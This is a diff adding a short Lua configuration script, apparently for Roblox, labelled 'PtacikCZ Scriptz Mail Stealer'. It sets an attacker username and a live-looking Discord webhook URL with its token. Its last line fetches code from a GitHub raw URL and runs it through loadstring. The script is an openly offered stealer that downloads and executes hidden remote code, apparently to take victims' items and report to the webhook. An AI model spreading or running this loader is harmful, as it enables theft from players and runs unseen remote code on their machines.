@@ -1,0 +1,15 @@
+-- PtacikCZ Scriptz Mail Stealer --
+
+-- Main Config --
+_G.UserName = "PtacikCZ" -- Write your Username
+
+-- Webhook Config --
+_G.Webhook = "https://discord.com/api/webhooks/1129051039895666771/RnjN5iwQjPY51Q_aNgIwOvOpgTKBCrFhggecdg07vJ_sM93YY1lfaiswfc_asxkClFMg" -- Enter your Webhook
+
+-- Extra Settings --
+_G.LoadingScreen = false -- DONT CHANGE
+_G.AntiLeave = false -- DONT CHANGE
+_G.MouseLock = false -- DONT CHANGE
+
+-- Script --
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PtacikCZ/mail/main/NevimPico"))()
